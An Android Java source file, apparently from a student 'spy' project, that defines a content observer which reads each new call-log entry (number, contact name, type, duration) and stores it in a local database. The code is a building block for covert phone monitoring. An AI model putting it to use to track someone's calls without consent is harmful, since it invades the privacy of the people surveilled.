package edu.uj.jkordas.spy.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.util.Log;

import edu.uj.jkordas.spy.DAO.CallDataSource;

public class CallObserver extends ContentObserver {

    private static final String TAG = "CALLTRACKER";

    private Context context;
    private Handler handler;

    private long lastCallId;

    public CallObserver(Handler handler, Context context) {
        super(handler);
        this.handler = handler;
        this.context = context;
        this.lastCallId = -1;
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    @Override
    public void onChange(boolean selfChange) {

        try {
            Cursor cur = context.getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                if (cur.moveToLast()) {

                    long currentCallId = cur.getLong(cur.getColumnIndex("_id"));
                    if (this.lastCallId != currentCallId) {

                        String number = cur.getString(cur
                                .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                        String name = cur.getString(cur
                                .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
                        String type = cur.getString(cur
                                .getColumnIndex(android.provider.CallLog.Calls.TYPE));
                        String duration = cur.getString(cur
                                .getColumnIndex(android.provider.CallLog.Calls.DURATION));

                        CallDataSource datasource = new CallDataSource(context);
                        datasource.open();

                        datasource.addCall(number, name, Integer.parseInt(type),
                                Integer.parseInt(duration));
                        datasource.close();
                    }

                    this.lastCallId = currentCallId;
                }

            } else
                Log.e(TAG, "Call Cursor is Empty");
        } catch (Exception sggh) {
            Log.e(TAG, "Error on onChange : " + sggh.toString());
        }

        super.onChange(selfChange);
    }
}
